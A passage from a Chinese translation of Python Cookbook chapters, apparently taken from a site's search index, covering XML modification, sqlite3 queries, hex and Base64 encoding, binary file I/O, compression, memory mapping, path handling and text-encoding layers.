<fd>Howard</fd> <v>1867</v> <rn>22</rn> </pre> </stop> 下面是一个利用 ElementTree 来读取这个文档并对它做一些修改的例子: >>> from xml.etree.ElementTree import parse, Element >>> doc = parse('pred.xml') >>> root = doc.getroot() >>> root <Element 'stop' at 0x100770cb0> >>> # Remove a few elements >>> root.remove(root.find('sri')) >>> root.remove(root.find('cr')) >>> # Insert a new element after <nm>...</nm> >>> root.getchildren().index(root.find('nm')) 1 >>> e = Element('spam') >>> e.text = 'This is a test' >>> root.insert(2, e) >>> # Write back to a file >>> doc.write('newpred.xml', xml_declaration=True) >>> 处理结果是一个像下面这样新的 XML 文件: <?xml version='1.0' encoding='us-ascii'?> <stop> <id>14791</id> <nm>Clark &amp; Balmoral</nm> <spam>This is a test</spam> <pre> <pt>5 MIN</pt> <fd>Howard</fd> <v>1378</v> <rn>22</rn> </pre> <pre> <pt>15 MIN</pt> <fd>Howard</fd> <v>1867</v> <rn>22</rn> </pre> </stop> 修改一个 XML 文档结构是很容易的，但是你必须牢记的是所有的修改都是针对 父节点元素，将它作为一个列表来处理。例如，如果你删除某个元素，通过调用父节 点的 remove() 方法从它的直接父节点中删除。如果你插入或增加新的元素，你同样使 用父节点元素的 insert() 和 append() 方法。还能对元素使用索引和切片操作，比如 element[i] 或 element[i:j] 利用命名空间解析 XML 文档 与关系型数据库的交互 在关系型数据库中查询、增加或删除记录 Python 中表示多行数据的标准方式是一个由元组构成的序列: stocks = [ ('GOOG', 100, 490.1), ('AAPL', 50, 545.75), ('FB', 150, 7.45), ('HPQ', 75, 33.2), ] 你可以使用 Python 标准库中的 sqlite3: >>> import sqlite3 >>> db = sqlite3.connect('database.db') >>> >>> c = db.cursor() >>> c.execute('create table portfolio (symbol text, shares integer, price␣ , real)') <sqlite3.Cursor object at 0x10067a730> >>> db.commit() >>> >>> c.executemany('insert into portfolio values (?,?,?)', stocks) <sqlite3.Cursor object at 0x10067a730> >>> db.commit() >>> >>> for row in db.execute('select * from portfolio'): ... print(row) ... ('GOOG', 100, 490.1) ('AAPL', 50, 545.75) ('FB', 150, 7.45) ('HPQ', 75, 33.2) >>> 如果你想接受用户输入作为参数来执行查询操作，必须确保你使用下面这样的占 位符 ‘‘?‘‘来进行引用参数: >>> min_price = 100 >>> for row in db.execute('select * from portfolio where price >= ?', (min_price,)): ... print(row) ... ('GOOG', 100, 490.1) ('AAPL', 50, 545.75) >>> 在比较低的级别上和数据库交互是非常简单的。你只需提供 SQL 语句并调用相应 的模块就可以更新或提取数据了。 一个难点是数据库中的数据和 Python 类型直接的映射。对于日期类型，通常可以 使用 datetime 模块中的 datetime 实例，或者可能是 time 模块中的系统时间戳。对 于数字类型，特别是使用到小数的金融数据，可以用 decimal 模块中的 Decimal 实例 来表示。不幸的是，对于不同的数据库而言具体映射规则是不一样的，你必须参考相应 的文档。 另外一个更加复杂的问题就是 SQL 语句字符串的构造。你千万不要使用 Python 字符串格式化操作符 (如%) 或者 .format() 方法来创建这样的字符串。如果传递给这 些格式化操作符的值来自于用户的输入，那么你的程序就很有可能遭受 SQL 注入攻击 (参考 http://xkcd.com/327 )。查询语句中的通配符 ? 指示后台数据库使用它自己的字 符串替换机制，这样更加的安全。 不幸的是，不同的数据库后台对于通配符的使用是不一样的。 大部分模块使用 ? 或 %s ，还有其他一些使用了不同的符号，比如:0 或:1 来指示参数。同样的，你还是得 去参考你使用的数据库模块相应的文档。一个数据库模块的 paramstyle 属性包含了参 数引用风格的信息。 对于简单的数据库数据的读写问题，使用数据库 API 通常非常简单。如果你要处 理更加复杂的问题，建议你使用更加高级的接口，比如一个对象关系映射 ORM 所提供 的接口。类似 SQLAlchemy 这样的库允许你使用 Python 类来表示一个数据库表，并且 能在隐藏底层 SQL 的情况下实现各种数据库的操作。 编码和解码十六进制数 将一个十六进制字符串解码成一个字节字符串或者将一个字节字符串编码成 一个十六进制字符串。 是简单的解码或编码一个十六进制的原始字符串，可以使用 binascii 模块。例如: >>> # Initial byte string >>> s = b'hello' >>> # Encode as hex >>> import binascii >>> h = binascii.b2a_hex(s) >>> h b'68656c6c6f' >>> # Decode back to bytes >>> binascii.a2b_hex(h) b'hello' >>> 类似的功能同样可以在 base64 模块中找到。例如: >>> import base64 >>> h = base64.b16encode(s) >>> h b'68656C6C6F' >>> base64.b16decode(h) b'hello' >>> 大部分情况下，通过使用上述的函数来转换十六进制是很简单的。上面两种技术的 主要不同在于大小写的处理。函数 base64.b16decode() 和 base64.b16encode() 只能 操作大写形式的十六进制字母，而 binascii 模块中的函数大小写都能处理。 在解码十六进制数时，函数 b16decode() 和 a2b_hex() 可以接受字节或 unicode 字符串。但是，unicode 字符串必须仅仅只包含 ASCII 编码的十六进制数。 编码解码 Base64 数据 使用 Base64 格式解码或编码二进制数据。 base64 模块中有两个函数 b64encode() and b64decode() 可以帮你解决这个问题。 例如: >>> # Some byte data >>> s = b'hello' >>> import base64 >>> # Encode as Base64 >>> a = base64.b64encode(s) >>> a b'aGVsbG8=' >>> # Decode from Base64 >>> base64.b64decode(a) b'hello' >>> Base64 编码仅仅用于面向字节的数据比如字节字符串和字节数组。此外，编码处 理的输出结果总是一个字节字符串。如果你想混合使用 Base64 编码的数据和 Unicode 文本，你必须添加一个额外的解码步骤。例如: >>> a = base64.b64encode(s).decode('ascii') >>> a 'aGVsbG8=' >>> 读写二进制数组数据 想读写一个二进制数组的结构化数据到 Python 元组中。 可以使用 struct 模块处理二进制数据。下面是一段示例代码将一个 Python 元组 列表写入一个二进制文件，并使用 struct 将每个元组编码为一个结构体: from struct import Struct def write_records(records, format, f): ''' Write a sequence of tuples to a binary file of structures. ''' record_struct = Struct(format) for r in records: f.write(record_struct.pack(*r)) # Example if __name__ == '__main__': records = [ (1, 2.3, 4.5), (6, 7.8, 9.0), (12, 13.4, 56.7) ] with open('data.b', 'wb') as f: write_records(records, '<idd', f) 读取嵌套和可变长二进制数据 需要读取包含嵌套或者可变长记录集合的复杂二进制格式的数据。这些数据可 能包含图片、视频、电子地图文件等。 struct 模块可被用来编码/解码几乎所有类型的二进制的数据结构。为了解释清 楚这种数据，假设你用下面的 Python 数据结构来表示一个组成一系列多边形的点的集 合: polys = [ [ (1.0, 2.5), (3.5, 4.0), (2.5, 1.5) ], [ (7.0, 1.2), (5.1, 3.0), (0.5, 7.5), (0.8, 9.0) ], [ (3.4, 6.3), (1.2, 0.5), (4.6, 9.2) ], ] ... 数据的累加与统计操作 需要处理一个很大的数据集并需要计算数据总和或其他统计量。 对于任何涉及到统计、时间序列以及其他相关技术的数据分析问题，都可以考虑使 用 Pandas 库: /docs/后端/python/python三方库/pandas","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-cookbook-Data-encoding-and-processing.html","loc":"/yq-doc-source-docs-rear-end-python-cookbook-Data-encoding-and-processing.html"},{"title":"文件/IO","text":"所有程序都要处理输入和输出。这一章将涵盖处理不同类型的文件，包括文本和二 进制文件，文件编码和其他相关的内容。对文件名和目录的操作也会涉及到。 读写文本数据 读写各种不同编码的文本数据，比如 ASCII，UTF-8 或 UTF-16 编码 使用带有 rt 模式的 open() 函数读取文本文件: # Read the entire file as a single string with open('somefile.txt', 'rt') as f: data = f.read() # Iterate over the lines of the file with open('somefile.txt', 'rt') as f: for line in f: # process line ... 文件的读写操作默认使用系统编码，可以通过调用 sys.getdefaultencoding() 来 得到。在大多数机器上面都是 utf-8 编码。 如果你已经知道你要读写的文本是其他编码 方式，那么可以通过传递一个可选的 encoding 参数给 open() 函数: with open('somefile.txt', 'rt', encoding='latin-1') as f: ... Python 支持非常多的文本编码。 几个常见的编码是 ascii, latin-1, utf-8 和 utf-16。 在 web 应用程序中通常都使用的是 UTF-8。ascii 对应从 U+0000 到 U+007F 范围内 的 7 位字符。 latin-1 是字节 0-255 到 U+0000 至 U+00FF 范围内 Unicode 字符的直 接映射。 当读取一个未知编码的文本时使用 latin-1 编码永远不会产生解码错误。 使用 latin-1 编码读取一个文件的时候也许不能产生完全正确的文本解码数据，但是它也能 从中提取出足够多的有用数据。 同时，如果你之后将数据回写回去，原先的数据还是会 保留的。 读写文本文件一般来讲是比较简单的。 但是也几点是需要注意的。 首先，在例子 程序中的 with 语句给被使用到的文件创建了一个上下文环境，但 with 控制块结束时， 文件会自动关闭。 你也可以不使用 with 语句，但是这时候你就必须记得手动关闭文件: f = open('somefile.txt', 'rt') data = f.read() f.close() 另外一个问题是关于换行符的识别问题，在 Unix 和 Windows 中是不一样的 (分别 是 n 和 rn )。 默认情况下，Python 会以统一模式处理换行符。 这种模式下，在读 取文本的时候，Python 可以识别所有的普通换行符并将其转换为单个 n 字符。 类似 的，在输出时会将换行符 n 转换为系统默认的换行符。 如果你不希望这种默认的处理 方式，可以给 open() 函数传入参数 newline='' # Read with disabled newline translation with open('somefile.txt', 'rt', newline='') as f: ... 为了说明两者之间的差异，下面我在 Unix 机器上面读取一个 Windows 上面的文 本文件，里面的内容是 hello world!rn >>> # Newline translation enabled (the default) >>> f = open('hello.txt', 'rt') >>> f.read() 'hello world!\\n' >>> # Newline translation disabled >>> g = open('hello.txt', 'rt', newline='') >>> g.read() 'hello world!\\r\\n' >>> 文本文件中可能出现的编码错误。但你读取或者写入一个文本 文件时，你可能会遇到一个编码或者解码错误. 表示你读取文本时指定的编码不正确。你最好仔细阅读说 明并确认你的文件编码是正确的 (比如使用 UTF-8 而不是 Latin-1 编码或其他)。 如果 编码错误还是存在的话，你可以给 open() 函数传递一个可选的 errors 参数来处理这 些错误。下面是一些处理常见错误的方法: >>> # Replace bad chars with Unicode U+fffd replacement char >>> f = open('sample.txt', 'rt', encoding='ascii', errors='replace') >>> f.read() 'Spicy Jalape?o!' >>> # Ignore bad chars entirely >>> g = open('sample.txt', 'rt', encoding='ascii', errors='ignore') >>> g.read() 'Spicy Jalapeo!' >>> 如果你经常使用 errors 参数来处理编码错误，可能会让你的生活变得很糟糕。 对 于文本处理的首要原则是确保你总是使用的是正确编码。 当模棱两可的时候，就使用默 认的设置 (通常都是 UTF-8) 打印输出至文件中 将 print() 函数的输出重定向到一个文件中去. 在 print() 函数中指定 file 关键字参数: with open('d:/work/test.txt', 'wt') as f: print('Hello World!', file=f) 文件必须是以文本 模式打开。如果文件是二进制模式的话，打印就会出错。 使用其他分隔符或行终止符打印 使用 print() 函数输出数据，但是想改变默认的分隔符或者行尾符 可以使用在 print() 函数中使用 sep 和 end 关键字参数，以你想要的方式输出。 比如: >>> print('ACME', 50, 91.5) ACME 50 91.5 >>> print('ACME', 50, 91.5, sep=',') ACME,50,91.5 >>> print('ACME', 50, 91.5, sep=',', end='!!\\n') ACME,50,91.5!! >>> 读写字节数据 读写二进制文件，比如图片，声音文件等等。 使用模式为 rb 或 wb 的 open() 函数来读取或写入二进制数据 在读取二进制数据时，需要指明的是所有返回的数据都是字节字符串格式的，而不 是文本字符串。 类似的，在写入的时候，必须保证参数是以字节形式对外暴露数据的对 象 (比如字节字符串，字节数组对象等)。 在读取二进制数据的时候，字节字符串和文本字符串的语义差异可能会导致一个 潜在的陷阱。 特别需要注意的是，索引和迭代动作返回的是字节的值而不是字节字符 串。比如: >>> b = b'Hello World' >>> b[0] 72 >>> for c in b: ... print(c) ... 72 101 108 108 111 ... >>> 如果你想从二进制模式的文件中读取或写入文本数据，必须确保要进行解码和编 码操作。比如: with open('somefile.bin', 'rb') as f: data = f.read(16) text = data.decode('utf-8') with open('somefile.bin', 'wb') as f: text = 'Hello World' f.write(text.encode('utf-8')) 二进制 I/O 还有一个鲜为人知的特性就是数组和 C 结构体类型能直接被写入，而 不需要中间转换为自己对象: import array nums = array.array('i', [1, 2, 3, 4]) with open('data.bin','wb') as f: f.write(nums) 这个适用于任何实现了被称之为\"缓冲接口\"的对象，这种对象会直接暴露其底层 的内存缓冲区给能处理它的操作。 二进制数据的写入就是这类操作之一。 很多对象还允许通过使用文件对象的 readinto() 方法直接读取二进制数据到其底 层的内存中去。比如: >>> import array >>> a = array.array('i', [0, 0, 0, 0, 0, 0, 0, 0]) >>> with open('data.bin', 'rb') as f: ... f.readinto(a) ... 16 >>> a array('i', [1, 2, 3, 4, 0, 0, 0, 0]) >>> 但是使用这种技术的时候需要格外小心，因为它通常具有平台相关性，并且可能会 依赖字长和字节顺序 (高位优先和低位优先)。 文件不存在才能写入 想像一个文件中写入数据，但是前提必须是这个文件在文件系统上不存在。也就 是不允许覆盖已存在的文件内容。 可以在 open() 函数中使用 x 模式来代替 w 模式的方法来解决这个问题: >>> with open('somefile', 'wt') as f: ... f.write('Hello\\n') ... >>> with open('somefile', 'xt') as f: ... f.write('Hello\\n') ... Traceback (most recent call last): File \"<stdin>\", line 1, in <module> FileExistsError: [Errno 17] File exists: 'somefile' >>> 如果文件是二进制的，使用 xb 来代替 xt 相对于先测试这个文件是否存在, 使用 x 文件模式更加简单。 要注意的是 x 模式是一个 Python3 对 open() 函数特有的扩展。 在 Python 的旧版本或者是 Python 实现的底层 C 函数库中都是没有 这个模式的。 字符串的 I/O 操作 使用操作类文件对象的程序来操作文本或二进制字符串。 使用 io.StringIO() 和 io.BytesIO() 类来创建类文件对象操作字符串数据: >>> s = io.StringIO() >>> s.write('Hello World\\n') 12 >>> print('This is a test', file=s) 15 >>> # Get all of the data written so far >>> s.getvalue() 'Hello World\\nThis is a test\\n' >>> >>> # Wrap a file interface around an existing string >>> s = io.StringIO('Hello\\nWorld\\n') >>> s.read(4) 'Hell' >>> s.read() 'o\\nWorld\\n' >>> io.StringIO 只能用于文本。如果你要操作二进制数据，要使用 io.BytesIO 类来 代替: >>> s = io.BytesIO() >>> s.write(b'binary data') >>> s.getvalue() b'binary data' >>> 当你想模拟一个普通的文件的时候 StringIO 和 BytesIO 类是很有用的。 比如，在 单元测试中，你可以使用 StringIO 来创建一个包含测试数据的类文件对象，这个对象 可以被传给某个参数为普通文件对象的函数。 需要注意的是，StringIO 和 BytesIO 实例并没有正确的整数类型的文件描述符。 因此，它们不能在那些需要使用真实的系统级文件如文件，管道或者是套接字的程序中 使用。 读写压缩文件 想读写一个 gzip 或 bz2 格式的压缩文件。 gzip 和 bz2 模块可以很容易的处理这些文件。 两个模块都为 open() 函数提供了 另外的实现来解决这个问题。比如，为了以文本形式读取压缩文件，可以这样做: # gzip compression import gzip with gzip.open('somefile.gz', 'rt') as f: text = f.read() # bz2 compression import bz2 with bz2.open('somefile.bz2', 'rt') as f: text = f.read() 大部分情况下读写压缩数据都是很简单的。但是要注意的是选择一个正确的文件 模式是非常重要的。 如果你不指定模式，那么默认的就是二进制模式，如果这时候程 序想要接受的是文本数据，那么就会出错。 gzip.open() 和 bz2.open() 接受跟内置的 open() 函数一样的参数，包括 encoding，errors，newline 等等。 当写入压缩数据时，可以使用 compresslevel 这个可选的关键字参数来指定一个 压缩级别。比如: with gzip.open('somefile.gz', 'wt', compresslevel=5) as f: f.write(text) 默认的等级是 9，也是最高的压缩等级。等级越低性能越好，但是数据压缩程度也 越低。 最后一点，gzip.open() 和 bz2.open() 还有一个很少被知道的特性，它们可以作 用在一个已存在并以二进制模式打开的文件上。 比如，下面代码是可行的: import gzip f = open('somefile.gz', 'rb') with gzip.open(f, 'rt') as g: text = g.read() 这样就允许 gzip 和 bz2 模块可以工作在许多类文件对象上，比如套接字，管道和 内存中文件等。 固定大小记录的文件迭代 在一个固定长度记录或者数据块的集合上迭代，而不是在一个文件中一行一 行的迭代。 使用 iter 和 functools.partial() 函数: from functools import partial RECORD_SIZE = 32 with open('somefile.data', 'rb') as f: records = iter(partial(f.read, RECORD_SIZE), b'') for r in records: ... 这个例子中的 records 对象是一个可迭代对象，它会不断的产生固定大小的数据 块，直到文件末尾。 要注意的是如果总记录大小不是块大小的整数倍的话，最后一个返 回元素的字节数会比期望值少。 在例子中，functools.partial 用来创建一个每次被调用时从文件中读取固定数 目字节的可调用对象。标记值 b'' 就是当到达文件结尾时的返回值。 最后再提一点，上面的例子中的文件时以二进制模式打开的。 如果是读取固定大小 的记录，这通常是最普遍的情况。而 对于文本文件，一行一行的读取 (默认的迭代行为) 更普遍点。 读取二进制数据到可变缓冲区中 直接读取二进制数据到一个可变缓冲区中，而不需要做任何的中间复制操作。 或者你想原地修改数据并将它写回到一个文件中去。 为了读取数据到一个可变数组中，使用文件对象的 readinto() 方法: import os.path def read_into_buffer(filename): buf = bytearray(os.path.getsize(filename)) with open(filename, 'rb') as f:\\ f.readinto(buf) return buf 例子: >>> # Write a sample file >>> with open('sample.bin', 'wb') as f: ... f.write(b'Hello World') ... >>> buf = read_into_buffer('sample.bin') >>> buf bytearray(b'Hello World') >>> buf[0:5] = b'Hallo' >>> buf bytearray(b'Hallo World') >>> with open('newsample.bin', 'wb') as f: ... f.write(buf) ... 11 >>> 文件对象的 readinto() 方法能被用来为预先分配内存的数组填充数据，甚至包括 由 array 模块或 numpy 库创建的数组。 和普通 read() 方法不同的是，readinto() 填 充已存在的缓冲区而不是为新对象重新分配内存再返回它们。 因此，你可以使用它来避 免大量的内存分配操作。比如，如果你读取一个由相同大小的记录组成的二进制文件 时，你可以像下面这样写: record_size = 32 # Size of each record (adjust value) buf = bytearray(record_size) with open('somefile', 'rb') as f: while True: n = f.readinto(buf) if n < record_size: break # Use the contents of buf ... 另外有一个有趣特性就是 memoryview ，它可以通过零复制的方式对已存在的缓冲 区执行切片操作，甚至还能修改它的内容。比如: >>> buf bytearray(b'Hello World') >>> m1 = memoryview(buf) >>> m2 = m1[-5:] >>> m2 <memory at 0x100681390> >>> m2[:] = b'WORLD' >>> buf bytearray(b'Hello WORLD') >>> 使用 f.readinto() 时需要注意的是，你必须检查它的返回值，也就是实际读取的 字节数。 如果字节数小于缓冲区大小，表明数据被截断或者被破坏了 (比如你期望每次读取 指定数量的字节)。 最后，留心观察其他函数库和模块中和 into 相关的函数 (比如 recv_into() ， pack_into() 等)。 Python 的很多其他部分已经能支持直接的 I/O 或数据访问操作，这 些操作可被用来填充或修改数组和缓冲区内容。 内存映射的二进制文件 你想内存映射一个二进制文件到一个可变字节数组中，目的可能是为了随机访问 它的内容或者是原地做些修改。 使用 mmap 模块来内存映射文件。下面是一个工具函数，向你演示了如何打开一个 文件并以一种便捷方式内存映射这个文件: import os import mmap def memory_map(filename, access=mmap.ACCESS_WRITE): size = os.path.getsize(filename) fd = os.open(filename, os.O_RDWR) return mmap.mmap(fd, size, access=access) 为了使用这个函数，你需要有一个已创建并且内容不为空的文件。下面是一个例 子，教你怎样初始创建一个文件并将其内容扩充到指定大小: >>> size = 1000000 >>> with open('data', 'wb') as f: ... f.seek(size-1) ... f.write(b'\\x00') ... >>> 利用 memory_map() 函数类内存映射文件内容: >>> m = memory_map('data') >>> len(m) 1000000 >>> m[0:10] b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' >>> m[0] 0 >>> # Reassign a slice >>> m[0:11] = b'Hello World' >>> m.close() >>> # Verify that changes were made >>> with open('data', 'rb') as f: ... print(f.read(11)) ... b'Hello World' >>> mmap() 返回的 mmap 对象同样也可以作为一个上下文管理器来使用，这时候底层 的文件会被自动关闭。比如: >>> with memory_map('data') as m: ... print(len(m)) ... print(m[0:10]) ... 1000000 b'Hello World' >>> m.closed True >>> 默认情况下，memeory_map() 函数打开的文件同时支持读和写操作。任何的修改 内容都会复制回原来的文件中。 如果需要只读的访问模式，可以给参数 access 赋值为 mmap.ACCESS_READ 如果你想在本地修改数据，但是又不想将修改写回到原始文件中，可以使用 mmap.ACCESS_COPY mmap 使用可参考: /docs/后端/python/python标准库/mmap 为了随机访问文件的内容，使用 mmap 将文件映射到内存中是一个高效和优雅的方 法。 例如，你无需打开一个文件并执行大量的 seek() ，read() ，write() 调用，只需 要简单的映射文件并使用切片操作访问数据即可。 一般来讲，mmap() 所暴露的内存看上去就是一个二进制数组对象。但是，你可以 使用一个内存视图来解析其中的数据。比如: >>> m = memory_map('data') >>> # Memoryview of unsigned integers >>> v = memoryview(m).cast('I') >>> v[0] = 7 >>> m[0:4] b'\\x07\\x00\\x00\\x00' >>> m[0:4] = b'\\x07\\x01\\x00\\x00' >>> v[0] 263 >>> 需要强调的一点是，内存映射一个文件并不会导致整个文件被读取到内存中。 也就 是说，文件并没有被复制到内存缓存或数组中。 相反，操作系统仅仅为文件内容保留了 一段虚拟内存。 当你访问文件的不同区域时，这些区域的内容才根据需要被读取并映射 到内存区域中。 而那些从没被访问到的部分还是留在磁盘上。所有这些过程是透明的， 在幕后完成! 如果多个 Python 解释器内存映射同一个文件，得到的 mmap 对象能够被用来在解 释器直接交换数据。 也就是说，所有解释器都能同时读写数据，并且其中一个解释器所做的修改会自动呈现在其他解释器中。 很明显，这里需要考虑同步的问题。但是这种方 法有时候可以用来在管道或套接字间传递数据。 文件路径名的操作 使用路径名来获取文件名，目录名，绝对路径等等。 使用 os.path 模块中的函数来操作路径名: >>> import os >>> path = '/Users/beazley/Data/data.csv' >>> # Get the last component of the path >>> os.path.basename(path) 'data.csv' >>> # Get the directory name >>> os.path.dirname(path) '/Users/beazley/Data' >>> # Join path components together >>> os.path.join('tmp', 'data', os.path.basename(path)) 'tmp/data/data.csv' >>> # Expand the user's home directory >>> path = '~/Data/data.csv' >>> os.path.expanduser(path) '/Users/beazley/Data/data.csv' >>> # Split the file extension >>> os.path.splitext(path) ('~/Data/data', '.csv') >>> 对于任何的文件名的操作，你都应该使用 os.path 模块，而不是使用标准字符串 操作来构造自己的代码。 特别是为了可移植性考虑的时候更应如此， 因为 os.path 模 块知道 Unix 和 Windows 系统之间的差异并且能够可靠地处理类似 Data/data.csv 和 Data\\data.csv 这样的文件名。 其次，你真的不应该浪费时间去重复造轮子。通常最好 是直接使用已经为你准备好的功能。 测试文件是否存在 使用 os.path 模块: >>> import os >>> os.path.exists('/etc/passwd') True 测试这个文件时什么类型的。在下面这些测试中，如果测试的文件不 存在的时候，结果都会返回 False: >>> # Is a regular file >>> os.path.isfile('/etc/passwd') True >>> # Is a directory >>> os.path.isdir('/etc/passwd') False >>> # Is a symbolic link >>> os.path.islink('/usr/local/bin/python3') True >>> # Get the file linked to >>> os.path.realpath('/usr/local/bin/python3') '/usr/local/bin/python3.3' 如果你还想获取元数据 (比如文件大小或者是修改日期)，也可以使用 os.path 模 块来解决: >>> os.path.getsize('/etc/passwd') 3669 >>> os.path.getmtime('/etc/passwd') 1272478234.0 >>> import time >>> time.ctime(os.path.getmtime('/etc/passwd')) 'Wed Apr 28 13:10:34 2010' >>> 使用 os.path 来进行文件测试是很简单的。 在写这些脚本时，可能唯一需要注意 的就是你需要考虑文件权限的问题，特别是在获取元数据时候 获取文件夹中的文件列表 对于文件名的匹配，你可能会考虑使用 glob 或 fnmatch 模块。比如: import glob pyfiles = glob.glob('somedir/*.py') from fnmatch import fnmatch pyfiles = [name for name in os.listdir('somedir') if fnmatch(name, '*.py')] 获取目录中的列表是很容易的，但是其返回结果只是目录中实体名列表而已。 如 果你还想获取其他的元信息，比如文件大小，修改时间等等，你或许还需要使用到 os.path 模块中的函数或着 os.stat() 函数来收集数据 最后还有一点要注意的就是，有时候在处理文件名编码问题时候可能会出现一些 问题。 通常来讲，函数 os.listdir() 返回的实体列表会根据系统默认的文件名编码来 解码。但是有时候也会碰到一些不能正常解码的文件名。 忽略文件名编码 你想使用原始文件名执行文件的 I/O 操作，也就是说文件名并没有经过系统默认 编码去解码或编码过。 默认情况下，所有的文件名都会根据 sys.getfilesystemencoding() 返回的文本 编码来编码或解码。比如: >>> sys.getfilesystemencoding() 'utf-8' >>> 如果因为某种原因你想忽略这种编码，可以使用一个原始字节字符串来指定一个 文件名即可。比如: >>> # Wrte a file using a unicode filename >>> with open('jalape\\xf1o.txt', 'w') as f: ... f.write('Spicy!') ... 6 >>> # Directory listing (decoded) >>> import os >>> os.listdir('.') ['jalapeño.txt'] >>> # Directory listing (raw) >>> os.listdir(b'.') # Note: byte string [b'jalapen\\xcc\\x83o.txt'] >>> # Open file with raw filename >>> with open(b'jalapen\\xcc\\x83o.txt') as f: ... print(f.read()) ... Spicy! >>> 通常来讲，你不需要担心文件名的编码和解码，普通的文件名操作应该就没问题 了。 但是，有些操作系统允许用户通过偶然或恶意方式去创建名字不符合默认编码的文 件。 这些文件名可能会神秘地中断那些需要处理大量文件的 Python 程序。 读取目录并通过原始未解码方式处理文件名可以有效的避免这样的问题，尽管这 样会带来一定的编程难度。 打印不合法的文件名 你的程序获取了一个目录中的文件名列表， 但是当它试着去打印文件名的时候 程序崩溃， 出现了 UnicodeEncodeError 异常和一条奇怪的消息——surrogates not allowed 。 当打印未知的文件名时，使用下面的方法可以避免这样的错误: def bad_filename(filename): return repr(filename)[1:-1] try: print(filename) except UnicodeEncodeError: print(bad_filename(filename)) 这一小节讨论的是在编写必须处理文件系统的程序时一个不太常见但又很棘手的 问题。 默认情况下，Python 假定所有文件名都已经根据 sys.getfilesystemencoding() 的值编码过了。 但是，有一些文件系统并没有强制要求这样做，因此允许创建文件名没 有正确编码的文件。 这种情况不太常见，但是总会有些用户冒险这样做或者是无意之 中这样做了 ( 可能是在一个有缺陷的代码中给 open() 函数传递了一个不合规范的文件 名)。 当执行类似 os.listdir() 这样的函数时，这些不合规范的文件名就会让 Python 陷入困境。 一方面，它不能仅仅只是丢弃这些不合格的名字。 而另一方面，它又不能将 这些文件名转换为正确的文本字符串。 Python 对这个问题的解决方案是从文件名中获 取未解码的字节值 比如 xhh 并将它映射成 Unicode 字符 udchh 表示的所谓的\"代理 编码\"。 下面一个例子演示了当一个不合格目录列表中含有一个文件名为 bäd.txt(使用 Latin-1 而不是 UTF-8 编码) 时的样子: >>> import os >>> files = os.listdir('.') >>> files ['spam.py', 'b\\udce4d.txt', 'foo.txt'] >>> 如果你有代码需要操作文件名或者将文件名传递给 open() 这样的函数，一切都能 正常工作。 只有当你想要输出文件名时才会碰到些麻烦 (比如打印输出到屏幕或日志文 件等)。 特别的，当你想打印上面的文件名列表时，你的程序就会崩溃: >>> for name in files: ... print(name) ... spam.py Traceback (most recent call last): File \"<stdin>\", line 2, in <module> UnicodeEncodeError: 'utf-8' codec can't encode character '\\udce4' in position 1: surrogates not allowed >>> 程序崩溃的原因就是字符 udce4 是一个非法的 Unicode 字符。 它其实是一个被 称为代理字符对的双字符组合的后半部分。由于缺少了前半部分，因此它是个非法的 Unicode。 所以，唯一能成功输出的方法就是当遇到不合法文件名时采取相应的补救措 施。比如可以将上述代码修改如下: >>> for name in files: ... try: ... print(name) ... except UnicodeEncodeError: ... print(bad_filename(name)) ... spam.py b\\udce4d.txt foo.txt >>> 在 bad_filename() 函数中怎样处置取决于你自己。另外一个选择就是通过某种方 式重新编码，示例如下: def bad_filename(filename): temp = filename.encode(sys.getfilesystemencoding(), errors='surrogateescape') return temp.decode('latin-1') 注解 surrogateescape含义 这种是 Python 在绝大部分面向 OS 的 API 中所使用的错误处理器， 它能以一种优雅的方式处理由操作系统提供的数据的编码问题。 在解码出错时会将出错字节存储到一个很少被使用到的 Unicode 编码范围内。 在编码时将那些隐藏值又还原回原先解码失败的字节序列。 它不仅对于 OS API 非常有用，也能很容易的处理其他情况下的编码错误。 此时的输出: spam.py bäd.txt foo.txt 增加或改变已打开文件的编码 你想在不关闭一个已打开的文件前提下增加或改变它的 Unicode 编码。 如果你想给一个以二进制模式打开的文件添加 Unicode 编码/解码方式，可以使用 io.TextIOWrapper() 对象包装它。比如: import urllib.request import io u = urllib.request.urlopen('http://www.python.org') f = io.TextIOWrapper(u, encoding='utf-8') text = f.read() 如果你想修改一个已经打开的文本模式的文件的编码方式，可以先使用 detach() 方法移除掉已存在的文本编码层，并使用新的编码方式代替。 下面是一个在 sys.stdout 上修改编码方式的例子: >>> import sys >>> sys.stdout.encoding 'UTF-8' >>> sys.stdout = io.TextIOWrapper(sys.stdout.detach(), encoding='latin-1') >>> sys.stdout.encoding 'latin-1' >>> 这样做可能会中断你的终端，这里仅仅是为了演示而已。 I/O 系统由一系列的层次构建而成。你可以试着运行下面这个操作一个文本文件的 例子来查看这种层次: >>> f = open('sample.txt','w') >>> f <_io.TextIOWrapper name='sample.txt' mode='w' encoding='UTF-8'> >>> f.buffer <_io.BufferedWriter name='sample.txt'> >>> f.buffer.raw <_io.FileIO name='sample.txt' mode='wb'> >>> io.TextIOWrapper 是一个编码和解码 Unicode 的文本处理层 io. BufferedWriter 是一个处理二进制数据的带缓冲的 I/O 层， io.FileIO 是一个表示操 作系统底层文件描述符的原始文件 增加或改变文本编码会涉及增加或改变最上面的 io.TextIOWrapper 层。 一般来讲，像上面例子这样通过访问属性值来直接操作不同的层是很不安全的。 例 如，如果你试着使用下面这样的技术改变编码看看会发生什么: >>> f <_io.TextIOWrapper name='sample.txt' mode='w' encoding='UTF-8'> >>> f = io.TextIOWrapper(f.buffer, encoding='latin-1') >>> f <_io.TextIOWrapper name='sample.txt' encoding='latin-1'> >>> f.write('Hello') Traceback (most recent call last): File \"<stdin>\", line 1, in <module> ValueError: I/O operation on closed file. >>> 结果出错了，因为 f 的原始值已经被破坏了并关闭了底层的文件。 detach() 方法会断开文件的最顶层并返回第二层，之后最顶层就没什么用了。例 如: >>> f = open('sample.txt', 'w') >>> f <_io.TextIOWrapper name='sample.txt' mode='w' encoding='UTF-8'> >>> b = f.detach() >>> b <_io.BufferedWriter name='sample.txt'> >>> f.write('hello') Traceback (most recent call last): File \"<stdin>\", line 1, in <module> ValueError: underlying buffer has been detached >>> 一旦断开最顶层后，你就可以给返回结果添加一个新的最顶层。比如: >>> f = io.TextIOWrapper(b, encoding='latin-1') >>> f <_io.TextIOWrapper name='sample.txt' encoding='latin-1'> >>> 尽管已经向你演示了改变编码的方法，但是你还可以利用这种技术来改变文件行 处理、错误机制以及文件处理的其他方面。例如: >>> sys.stdout = 